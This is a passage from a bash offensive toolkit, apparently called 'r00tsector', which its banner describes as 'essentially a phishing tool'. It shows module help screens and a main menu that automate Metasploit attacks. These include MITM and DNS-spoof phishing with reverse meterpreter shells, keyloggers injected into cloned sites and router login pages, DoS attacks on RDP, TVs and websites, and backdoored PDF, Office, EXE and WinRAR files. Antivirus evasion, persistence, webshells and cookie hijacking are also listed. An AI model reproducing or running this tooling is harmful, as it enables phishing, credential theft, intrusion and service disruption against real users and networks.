                     'fakewebpage' that triggers the download of powershell.bat.
                     then a simple command (in powershell.bat) can load a waiting
                     payload in a remote server via HTTP. This payload is loaded
                     in memory and does not write to the disk so it potentially
                     evade AV detections.


  REFERENCIES      : http://sourceforge.net/users/peterubuntu10
                     https://www.rapid7.com/db/modules/exploit/multi/script/web_delivery
                     http://www.rapid7.com/db/modules/payload/windows/meterpreter/reverse_tcp

  IDS/AV EVASION   : potentially evade AV detections

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}






sh_6help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : Host a file attack
  ATTACK           : mitm + dns-spoof + hosted file
  RANK             : excellent
  SESSION TYPES    : shell, meterpreter
  AUTHOR           : pedro ubuntu [r00t-3xp10it]

  LHOST            : the local host or wan ip addr for connect back
  LPORT            : the local port for connect back
  HTML TITLE       : the title to give to the phishing webpage
  HTML description : write some text to be displayed in the phishing
                     webpage body, to better trick a target to execute
                     the deliver payload.

  FILE TO HOST     : the_file_name.bat (or any other extension)
  LOCAL STORAGE    : $apache/the_file_name.bat
  PAYLOADS         : java/meterpreter/reverse_tcp
                     windows/meterpreter/reverse_tcp
                     generic/shell_reverse_tcp
                     osx/ppc/shell/reverse_tcp
                     osx/x86/vforkshell/reverse_tcp

  POST-EXPLOITATION: migrate = migrate to -> $mig
                     default = dont migrate to AUTORITY/SYSTEM process
                     killav  = stop Anti-Virus process
                     scraper = enumerate just about everything
                     persistence = start the backdoor in target startup
                     post-auto = automate post-exploitation

  AFFECTED SYSTEMS : Apple OSx, Linux, Windows, BSD, Solaris
  DESCRIPTION      : insert a payload into a phishing webpage then use mitm
                     and dns-spoof to redirect target Network Traffic to our
                     'fakeupdate' start a listenner for waiting the connection
                     with remote target and if target machine executes the payload
                     then we are presented with a meterpreter session.

  REFERENCIES      : http://sourceforge.net/users/peterubuntu10
                     http://www.rapid7.com/db/modules/payload/windows/meterpreter/reverse_tcp

  IDS/AV EVASION   : Depending of the hoted file obfuscation method used,
                     the attack can produce a FUD (Fully UnDetectable).

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}





sh_7help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : java_keylogger
  ATTACK           : mitm + dns-spoof + java_keylogger
  RANK             : excellent
  SESSION TYPES    : N/A
  AUTHOR           : pedro ubuntu [r00t-3xp10it]

  LHOST            : the local host or wan ip addr for connect back
  LPORT            : 8080
  TARGET           : the webpage to be cloned 
  FILENAME         : index.html
  LOCAL STORAGE    : $apache/target
                     $apache/index.html
  PAYLOADS         : auxiliary/server/capture/http_javascript_keylogger

  AFFECTED SYSTEMS : Apple OSx, Linux, Windows, BSD, Solaris
  DESCRIPTION      : insert a keylogger into a phishing webpage then use mitm
                     and dns-spoof to redirect target Network Traffic to our
                     'cloned website', start a listenner for waiting the connection
                     with remote target and if target machine access the cloned
                     website then we can capture target keystrokes.

  REFERENCIES      : http://sourceforge.net/users/peterubuntu10
                     http://www.rapid7.com/db/modules/auxiliary/server/capture/http_javascript_keylogger

  IDS/AV EVASION   : N/A (Fully undetectable)

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}



sh_8help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : Java.jar phishing
  ATTACK           : mitm + dns-spoof + java.jar
  RANK             : great
  SESSION TYPES    : meterpreter
  AUTHOR           : pedro ubuntu [r00t-3xp10it]

  LHOST            : the local host or wan ip addr for connect back
  LPORT            : the local port for connect back
  FILENAME         : java.jar
  LOCAL STORAGE    : $H0m3/opensource/priv8/java.jar
                     $apache/java.jar

  PAYLOADS         : java/meterpreter/reverse_tcp
  EXEC             : phishing download webbpage
                     Drive-by URL payload execution

  POST-EXPLOITATION: default listenner (multi-handler)
                     post-auto = automate post-exploitation

  AFFECTED SYSTEMS : Apple OSX, Linux, Windows, BSD, Solaris
  DESCRIPTION      : this module uses mitm + dns_spoof to redirect a target to your
                     phishing download webpage stored in apache webserver that triggers
                     a java.jar download to target, that we must execute in order for us
                     to recibe the remote connection If used Drive-by URL payload execution
                     option then the payload will auto-download/execute without any target
                     intervention just by visiting the malicious URL, also if used java_jre7
                     the target will be redirected to a malicious URL that triggers the
                     payload (sanbox bypass)...

  REFERENCIES      : http://sourceforge.net/users/peterubuntu10
                     http://www.rapid7.com/db/modules/payload/java/meterpreter/reverse_tcp

  IDS/AV EVASION   : medium av detection rate

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}




sh_9help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : java_applet attack
  ATTACK           : mitm + dns-spoof + java_applet
  RANK             : great
  SESSION TYPES    : shell, meterpreter
  AUTHOR           : pedro ubuntu [r00t-3xp10it]

  LHOST            : the local host or wan ip addr for connect back
  LPORT            : 8080
  TARGET           : the target webpage to be cloned
  APPLETNAME       : the name to give to the applet
  FILENAME         : index.html
  LOCAL STORAGE    : $apache/index.html
                     $apache/target
  PAYLOADS         : java/meterpreter/reverse_tcp
                     windows/meterpreter/reverse_tcp
                     generic/shell_reverse_tcp
                     osx/ppc/shell/reverse_tcp
                     osx/x86/vforkshell/reverse_tcp

  POST-EXPLOITATION: migrate = migrate to -> $mig
                     default = dont migrate to AUTORITY/SYSTEM process
                     killav  = stop Anti-Virus process
                     scraper = enumerate just about everything
                     persistence = start the backdoor in target startup
                     post-auto = automate post-exploitation

  AFFECTED SYSTEMS : Apple OSx, Linux, Windows, BSD, Solaris
  DESCRIPTION      : insert a payload into a phishing webpage then use mitm
                     and dns-spoof to redirect target Network Traffic to our
                     'cloned website', start a listenner for waiting the connection
                     with remote target and if target machine access the cloned
                     website then is presented to target a java_applet for execution
                     and we are presented with a remote session.

  REFERENCIES      : http://sourceforge.net/users/peterubuntu10
                     http://www.rapid7.com/db/modules/payload/java/meterpreter/reverse_tcp
                     http://www.rapid7.com/db/modules/payload/windows/meterpreter/reverse_tcp
                     http://www.rapid7.com/db/modules/payload/generic/shell_reverse_tcp
                     http://www.rapid7.com/db/modules/payload/osx/ppc/shell/reverse_tcp
                     http://www.rapid7.com/db/modules/payload/osx/x86/vforkshell/reverse_tcp

  IDS/AV EVASION   : N/A 

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}




sh_10help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : browser_autopwn
  ATTACK           : browser_autopwn + Iframe
  RANK             : great
  SESSION TYPES    : shell, meterpreter
  AUTHOR           : pedro ubuntu [r00t-3xp10it]

  LHOST            : the local host or wan ip addr for connect back
  LPORT            : N/A
  TARGET           : the target webpage to clone 
  FILENAME         : index.html
  LOCAL STORAGE    : $apache/index.html
                     $apache/target
  PAYLOADS         : auxiliary/server/browser_autopwn

  AFFECTED SYSTEMS : Apple OSx, Linux, Windows, BSD, Solaris
  DESCRIPTION      : insert a payload into a phishing webpage then use mitm
                     and dns-spoof to redirect target Network Traffic to our
                     'cloned website', start a listenner for waiting the connection
                     with remote target and if target machine access the cloned
                     website then browser_autopwn will launch all browser based
                     exploits againts the target.

  REFERENCIES      : http://sourceforge.net/users/peterubuntu10
                     http://www.rapid7.com/db/modules/auxiliary/server/browser_autopwn

  IDS/AV EVASION   : N/A 

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}




sh_11help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : Block target network access
  ATTACK           : mitm + dns-spoof
  RANK             : normal
  SESSION TYPES    : N/A
  AUTHOR           : pedro ubuntu [r00t-3xp10it]

  TARGET           : the target ip addr 
  ROUTER           : the router/modem ip addr
  FILENAME         : index.html
  LOCAL STORAGE    : $apache/index.html
                     $apache/target
  PAYLOADS         : N/A

  AFFECTED SYSTEMS : Apple OSx, Linux, Windows, BSD, Solaris
  DESCRIPTION      : this module will use ettercap framework to
                     redirect a target on your local network to our
                     block.html webpage.

  REFERENCIES      : http://sourceforge.net/users/peterubuntu10

  IDS/AV EVASION   : N/A (Fully undetectable)

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}




sh_12help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : Samsung Plasma TV DoS
  ATTACK           : DoS (denial-of-service)
  RANK             : great
  SESSION TYPES    : N/A
  AUTHOR           : pedro ubuntu [r00t-3xp10it]

  RPORT            : 5600
  TARGET           : the target host ip address 
  FILENAME         : N/A
  LOCAL STORAGE    : N/A
  PAYLOADS         : samsung_reset.py (python)

  AFFECTED SYSTEMS : Samsung PS50C7700 plasma TV
  DESCRIPTION      : the web server (DMCRUIS/0.1) on port TCP/5600
                     is crashing by sending a long HTTP GET request
                     As a results, the TV reboots...

  REFERENCIES      : http://sourceforge.net/users/peterubuntu10
                     http://www.itsecgames.com

  IDS/AV EVASION   : N/A (Fully undetectable)

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}





sh_13help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : RDP DoS attack
  ATTACK           : DoS (denial-of-service)
  RANK             : normal
  SESSION TYPES    : N/A
  AUTHOR           : pedro ubuntu [r00t-3xp10it]

  RHOST            : the remote host ip addr for connect back
  RPORT            : 3389
  FILENAME         : N/A
  LOCAL STORAGE    : N/A
  PAYLOADS         : auxiliary/dos/windows/rdp/ms12_020_maxchannelids

  AFFECTED SYSTEMS : Windows XP SP3
                     Windows XP Professional x64 SP2
                     Windows Server 2003 SP2
                     Windows Server 2003 x64 SP2
                     Windows Vista SP2
                     Windows Vista x64 SP2
                     Windows Server 2008 32 SP2
                     Windows Server 2008 x64 SP2
                     Windows 7 for 32 and Windows 7 32 SP1
                     Windows 7 for x64 and Windows 7 for x64 SP1
                     Windows Server 2008 R2 x64 and Windows Server 2008 R2 x64 SP1

  DESCRIPTION      : This module exploits the MS12-020 RDP vulnerability
                     discovered and reported by Luigi Auriemma, causing
                     a denial-of-service condition on target host.

  REFERENCIES      : http://sourceforge.net/users/peterubuntu10
                     http://cvedetails.com/cve/2012-0002/
                     http://www.rapid7.com/db/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids

  IDS/AV EVASION   : N/A (most systems patched)

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}




sh_14help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : website D0S SYN flood
  ATTACK           : Dos attack using syn packets
  RANK             : normal
  SESSION TYPES    : N/A
  AUTHOR           : pedro ubuntu [r00t-3xp10it]

  RHOST            : the target ip address or URL domain
  TIMEOUT          : between requests 
  FILENAME         : N/A
  LOCAL STORAGE    : N/A
  PAYLOADS         : auxiliary/dos/tcp/synflood

  AFFECTED SYSTEMS : webservers
  DESCRIPTION      : This module exploits a denial-of-service
                     condition on target website.

  REFERENCIES      : http://sourceforge.net/users/peterubuntu10
                     http://www.rapid7.com/db/modules/auxiliary/dos/tcp/synflood

  IDS/AV EVASION   : N/A

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}




sh_15help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : firefox_xpi_bootstrapped_addon
  ATTACK           : mitm + dns_spoof
  RANK             : excellent
  SESSION TYPES    : shell, meterpreter
  AUTHOR           : pedro ubuntu [r00t-3xp10it]

  SRVHOST          : the local host ip addr for connect back
  SRVPORT          : 8080
  ADDONNAME        : the name to give to the applet
  HTML TITLE       : the title to give to index.html
  LOCAL STORAGE    : $apache/index.html
  PAYLOADS         : windows/meterpreter/reverse_tcp

  AFFECTED SYSTEMS : firefox webBrowser (Windows OS)
  DESCRIPTION      : this exploit creates a .xpi addon file. the resulting bootstrapped
                     firefox addon is presented to the victim via a web page, the victims
                     firefox browser will pop a dialog asking if they trust the addon,
                     once the user clicks 'install' the addon is installed and execute
                     the payload

  REFERENCIES      : http://sourceforge.net/users/peterubuntu10

  IDS/AV EVASION   : N/A

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}





sh_16help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : PDF backdoor
  ATTACK           : embedded a payload into a pdf file
  RANK             : normal
  SESSION TYPES    : shell, meterpreter
  AUTHOR           : pedro ubuntu [r00t-3xp10it]

  LHOST            : the local host or wan ip addr for connect back
  LPORT            : the local port for connect back
  FILENAME         : chose the pdf filename
  LOCAL STORAGE    : /opensource/priv8/filename.pdf

  EXPLOIT          : windows/fileformat/adobe_pdf_embedded_exe
  PAYLOADS         : windows/messagebox
                     windows/download_exec
                     windows/meterpreter/reverse_tcp


  AFFECTED SYSTEMS : Adobe Reader v8.x, v9.x (Windows XP SP3 English/Spanish)
  DESCRIPTION      : This module embeds a Metasploit payload into an existing
                     PDF file. The resulting PDF can be sent to a target as
                     part of a social engineering attack..

  REFERENCIES      : http://sourceforge.net/users/peterubuntu10
                     http://cvedetails.com/cve/2010-1240/
                     http://www.rapid7.com/db/modules/exploit/windows/fileformat/adobe_pdf_embedded_exe

  IDS/AV EVASION   : obsolet

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}





sh_17help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : WinRAR Filename Spoofing
  ATTACK           : N/A
  RANK             : excellent
  SESSION TYPES    : shell, meterpreter
  AUTHOR           : pedro ubuntu [r00t-3xp10it]

  LHOST            : the local host ip addr for connect back
  ADDONNAME        : the name to give to the addon
  SPOOF            : the name to give to file.txt
  LOCAL STORAGE    : /opensource/priv8/file.zip
  PAYLOADS         : windows/meterpreter/reverse_tcp

  POST-EXPLOITATION: migrate = migrate to -> $mig
                     default = dont migrate to AUTORITY/SYSTEM process
                     killav  = stop Anti-Virus process
                     scraper = enumerate just about everything
                     persistence = start the backdoor in target startup
                     post-auto = automate post-exploitation

  AFFECTED SYSTEMS : Winrar (Windows OS)
  DESCRIPTION      : This module abuses a filename spoofing vulnerability in WinRAR. The
                     vulnerability exists when opening ZIP files. The file names showed
                     in WinRAR when opening a ZIP file come from the central directory,
                     but the file names used to extract and open contents come from the
                     Local File Header. This inconsistency allows to spoof file names
                     when opening ZIP files with WinRAR, which can be abused to execute
                     arbitrary code, as exploited in the wild in March 2014.

  REFERENCIES      : http://sourceforge.net/users/peterubuntu10
                     http://www.securityfocus.com/bid/66383
                     http://awsweb.rapid7.com/db/modules/exploit/windows/fileformat/winrar_name_spoofing
                     http://securityaffairs.co/wordpress/23623/hacking/winrar-zero-day.html

  IDS/AV EVASION   : N/A

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}







sh_18help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

  NAME             : macro VBS injection (microsoft office document macro)
  ATTACK           : embedded a payload into a world document
  RANK             : great
  SESSION TYPES    : shell, meterpreter
  AUTHOR           : pedro ubuntu [r00t-3xp10it]

  LHOST            : the local host or wan ip addr for connect back
  LPORT            : the local port for connect back
  FILENAME         : chose the VBS filename
  LOCAL STORAGE    : /opensource/priv8/filename.vbs
  PAYLOADS         : windows/meterpreter/reverse_tcp

  POST-EXPLOITATION: migrate = migrate to -> $mig
                     default = dont migrate to AUTORITY/SYSTEM process
                     killav  = stop Anti-Virus process
                     scraper = enumerate just about everything
                     persistence = start the backdoor in target startup
                     post-auto = automate post-exploitation

  AFFECTED SYSTEMS : Microsoft world document (VBScript macro injection)
  DESCRIPTION      : What this module does, is to create a VBS script to be
                     inserted in a world doc using the 'visual basic editor'
                     to create a macro with our payload inside the world doc.
                     The resulting world.doc can be sent to a target as
                     part of a social engineering attack...

  REFERENCIES      : http://sourceforge.net/users/peterubuntu10
                     http://www.offensive-security.com/metasploit-unleashed/VBScript_Infection_Methods
                     http://www.dgodam.com/2011/03/metasploit-vbscript-infection-method.html


  IDS/AV EVASION   : FUD

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}








sh_19help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

 NAME             : router login phishing
 ATTACK           : mitm + dns_spoof + phishing
 RANK             : exelente
 SESSION TYPES    : shell
 AUTHOR           : pedro ubuntu [r00t-3xp10it]

 LHOST            : the local host for connect back
 LPORT            : 8080
 LOCAL STORAGE    : /var/www/index.html
 PAYLOADS         : auxiliary/server/capture/http_javascript_keylogger
 INJECTION: <script type="text/javascript" src="http://LHOST:8080/URIPATH/test.js"></script>

 AFFECTED SYSTEMS : OSX, LINUX, WINDOWS, BSD, SOLARIS
 DESCRIPTION      : this module attemps to capture router admin login
                    credentials under LAN (local lan) using MitM,
                    DNS_spoof, and a fake router login webpage stored
                    in apache2 webserver, the attack will redirect all
                    domains to our fake login phishing webpage that
                    contains a java keylooger to capture keystrokes

 REFERENCIES      : http://sourceforge.net/users/peterubuntu10

 IDS/AV EVASION   : FUD

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}








sh_20help () {
clear
Colors;
echo ""
echo ${BlueF}+-------------------------------+ ${Reset};
echo "| AUTOMATED EXPLOIT CONFIG INFO | "
echo ${BlueF}+-------------------------------+ ${Reset};

cat << !

 NAME             : hackingteam adobe_flash browser exploit
 ATTACK           : mitm + dns_spoof + phishing
 RANK             : great
 SESSION TYPES    : shell, meterpreter
 AUTHOR           : pedro ubuntu [r00t-3xp10it]

 LHOST            : the local host for connect back
 LPORT            : the local port for connect back
 HTML TITLE       : name to give to webpage title
 URIPATH          : give a name to url to present to target
 LOCAL STORAGE    : /var/www/index.html

 EXPLOIT          : exploit/multi/browser/adobe_flash_hacking_team_uaf
 INJECTION: <meta http-equiv='refresh' content='5; url=http://LHOST:LPORT/URIPATH' />

 POST-EXPLOITATION: migrate = migrate to -> $mig
                    default = dont migrate to AUTORITY/SYSTEM process
                    killav  = stop Anti-Virus process
                    scraper = enumerate just about everything
                    persistence = start the backdoor in target startup
                    post-auto = automate post-exploitation (ERB file)

 AFFECTED SYSTEMS : Windows 7 SP1 (32-bit), IE11 and Adobe Flash 18.0.0.194,
                    Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 18.0.0.194,
                    Windows 8.1 (32-bit), IE11 and Adobe Flash 18.0.0.194,
                    Windows 8.1 (32-bit), Firefox and Adobe Flash 18.0.0.194, and
                    Linux Mint (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.468.

 DESCRIPTION      : this module uses mitm+dns_spoof to redirect a target to your
                    phishing webpage stored in apache webserver,that triggers a
                    redirecting to adobe_flash_browser_exploit that uploads
                    msf.swf to target disk and execute it (meterpreter payload)

 REFERENCIES      : http://sourceforge.net/users/peterubuntu10

 IDS/AV EVASION   : ???

!
   echo ${BlueF}[*]${RedF}:${BlueF}press ${YellowF}[Enter]${BlueF} to 'return' to r00tsector ${Reset};
   read op
   clear
}








# -------------------------------
# exit script priv8.sh
# -------------------------------
sh_exit () {
Colors;
echo ${RedF}[x]:[quiting module]... ${Reset};

   # clean script
   rm -r $tWd > /dev/null 2>&1
   /etc/init.d/apache2 stop
   sleep 1
 exit
}







# ----------------------------------
# TOOLKIT DATABASE.db DISPLAY
# ----------------------------------
sh_database () {
Colors;

   # check if database file exists
   if [ -e $H0m3/opensource/modules/database.db ]; then
     sh_database2

else

 Colors;
 zenity --warning --title="T00LKIT DATABASE - NOT FOUND" --text "Please Check:\n/opensource/modules/database.db" --width 350 > /dev/null 2>&1
 clear
fi
}


sh_database2 () {
Colors;

   # store scans in database?
   dbt=$(zenity --list --title "T00LKIT DATABASE (database.db)" --text "Access t00lkit database?" --radiolist --column "Pick" --column "Option" TRUE "View database?" FALSE "Clear Database" FALSE "Append to DataBase" FALSE "Clear Database and manually input" --width 330 --height 200) > /dev/null 2>&1


     if [ "$dbt" = "View database?" ]; then
       sh_database3 # goto view database display


     elif [ "$dbt" = "Clear Database" ]; then
       echo "" > $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1


     elif [ "$dbt" = "Append to DataBase" ]; then
       dtr=`date`
       mad=$(zenity --title="APPEND TO DATABASE" --text "You can input TARGET-IP, NOTES" --entry --width 330) > /dev/null 2>&1
       echo "" >> $H0m3/opensource/modules/database.db
       echo "" >> $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$mad" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Appended to DataBase" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1


     elif [ "$dbt" = "Clear Database and manually input" ]; then
       dtr=`date`
       mad=$(zenity --title="CLEAN AND APPEND TO DATABASE" --text "You can input TARGET-IP, NOTES" --entry --width 330) > /dev/null 2>&1
       echo "" > $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$mad" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean with\nnew Append" --width 300 > /dev/null 2>&1


else

   Colors;
   echo ${RedF}[x]:[ QUITTING ]${Reset};
   sleep 2
fi
}



sh_database3 () {
Colors;

     # Display current settings stored in database
     echo ${RedF}+-------------------------------+${Reset};
     echo ${RedF}'|'- T00LKIT DATABASE - NOTEBOOK -'|'${Reset};
     echo ${RedF}+-------------------------------+${Reset};
     # display results in green fonts
     echo ${GreenF}
     cat $H0m3/opensource/modules/database.db
     echo ${Reset};
     echo ${BlueF}[*]${RedF}:${YellowF}Press [${GreenF} ENTER ${YellowF}] to Exit database.${Reset};
     read op
     clear

}







# -----------------------------------------
#  Shellter dynamic PE injector by: kyREcon
# -----------------------------------------
sh_Shellter () {
Colors;

      # checking for wine install
      vinho=`which wine`
      if [ "$?" -eq "0" ]; then
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${BlueF}[wine]:${white}installation found...${Reset};
      else
      echo ${RedF}[x]${white}☠ ${BlueF}[wine]:${RedF}[ NOT FOUND ] ${Reset};
      sleep 2
      fi

QuE=$(zenity --question --title="☠ Shellter - dynamic PE injector ☠" --text "Shellter can be used in order to inject shellcode into\nnative Windows applications (currently 32-bit apps\nonly), it uses 'WINE' under Linux distros.\n\nAuthor: [ kyREcon ]\nOficial webpage: https://www.shellterproject.com/" --width 450) > /dev/null 2>&1

   # port native windows appl to shellter working dir
   if [ "$?" -eq "0" ]; then
   appl=$(zenity --title "☠ Shellter - Chose file to be backdoored ☠" --filename=$H0m3/opensource/templates/ --file-selection) > /dev/null 2>&1
   cp $appl $H0m3/opensource/shellter
   cd shellter
   chown $user *.exe
   echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ ${BlueF}[shellter]:${white}File Successfully copy to shellter...${Reset};
   sleep 2
   echo ""

      # in ubuntu distros we can not run shellter.exe in wine with root privs
      # so we need to run it in the context of a normal user...      
      su $user -c "wine shellter.exe"
      zenity --info --title="☠ Shellter - dynamic PE injector ☠" --text "access generated files in:\n$H0m3/opensource/priv8/" --width 330 > /dev/null 2>&1
      rm *.bak
      mv *.exe /$H0m3/opensource/priv8
      mv $H0m3/opensource/priv8/shellter.exe $H0m3/opensource/shellter/shellter.exe
      cd $H0m3/opensource

   else

     echo ${RedF}[x]${white}☠ ${BlueF}[Shellter PE injector]:${RedF}[ ABORTED ] ${Reset};
     sleep 2
     clear
   fi
}






# -------------------------------
#  menu principal
# -------------------------------
cd $H0m3/opensource


# Loop forever
while :
do
clear
cat << !
                                  |                      |
                __|  _ \    _ \   __|   __|   _ \   __|  __|   _ \    __|
               |    (   |  (   |  |   \__ \   __/  (     |    (   |  |
              _|   \___/  \___/  \__| ____/ \___| \___| \__| \___/  _|$ver
 +----------------------------------------------------------------------------------+
 |                          'essentially its a phishing tool'                       |
 |                   Coded by: peterubuntu10[at]sourceforge[dot]net                 |
 +----------------------------------------------------------------------------------+

    _ Automated Exploits:          Attack vector:                          Rank:
    1  - Package.deb backdoor      [Binary linux trojan + listenner]       normal
    2  - Backdooring EXE Files     [Backdooring EXE Files (trojan)]        excellent
    3  - FakeUpdate.exe            [dns-spoof + mitm + backdoor.exe]       great
    4  - Powershell (ReL1K)        [dns_spoof + mitm + powershell.bat]     excellent
    5  - Web_delivery (PSH/PYTHON) [dns_spoof + mitm + psh OR python]      excellent
    6  - Host a file attack        [dns-spoof + mitm + hosted file]        excellent
    7  - Website keylogger         [dns-spoof + mitm + js_keylogger]       excellent
    8  - Java.jar phishing         [dns-spoof + mitm + java.jar]           great
    9  - Clone website             [dns-spoof + mitm + java-applet]        great
    10 - Clone WebSite             [dns-spoof + mitm + browser_autopwn]    great
    11 - Block network access      [dns-spoof + mitm + index.html]         normal
    12 - Samsung TV DoS            [WAN Plasma TV DoS attack]              great
    13 - RDP DoS attack            [Dos attack against target RDP]         normal
    14 - Website D0S flood         [Dos attack using syn packets]          normal
    15 - Firefox addon             [dns_spoof + mitm + firefox_addon]      excellent
    16 - PDF backdoor              [embebed a payload into a pdf]          normal
    17 - WINRAR backdoor           [embebed a payload into a winrar]       excellent
    18 - Macro VBS injection       [microsoft word doc macro]              great
    19 - ROUTER phishing           [dns_spoof + mitm + router-login]       excellent
    20 - Adobe_hacking_team        [dns_spoof + mitm + browser-exploit]    great
 
    _ Normal Payloads:             Attack vector:
    21 - Windows.exe payload       [Windows-distros payload]
    22 - Mac osx payload           [Apple-distros payload]
    23 - Linux payload             [Linux-distros payload]
    24 - Java Signed Applet        [Multi-operative systems]
    25 - Android exploit           [android backdoor]
    26 - Webshell.php              [Website backdoor shell]
    27 - Generate shellcode        [C|[P]erl|Rub[y]|[R]aw|[J]s|e[X]e|[D]ll|[V]BA|[W]ar]
    28 - Session hijacking         [cookie hijacking]
    29 - Shellter PE infector      [build obfuscated backdoors]
  _
 |  l - Start a listenner
 | db - Access database            [toolkit database]
 |_ q - Exit module

!
sleep 1
Colors;
echo ${RedF}'_'${Reset};
echo ${BlueF}[*]${RedF}:${BlueF}[WAN IP ADDR: ${GreenF}$extIP ${BlueF}LHOST: ${GreenF}$IP${BlueF} ]${Reset};
echo ${BlueF}[*]${RedF}:${BlueF}[INTERFACE IN USE: ${GreenF}$InT3R ${BlueF}GATEWAY: ${GreenF}$GATE${BlueF} ]${Reset};
echo ${BlueF}[*]${RedF}:${YellowF}[nº][help]${BlueF}[Displays selected module config Info ]${Reset};
echo -n "[>]:[your choice?]:"
read choice
case $choice in
1) sh_package ;;
2) sh_backdoorfile ;;
3) sh_fake ;;
4) sh_FUD ;;
5) sh_driveby ;;
6) sh_powershell ;;
7) sh_cloneph ;;
8) sh_javajar ;;
9) sh_dnsjava ;;
10) sh_clone ;;
11) sh_block ;;
12) sh_san ;;
13) sh_rdp ;;
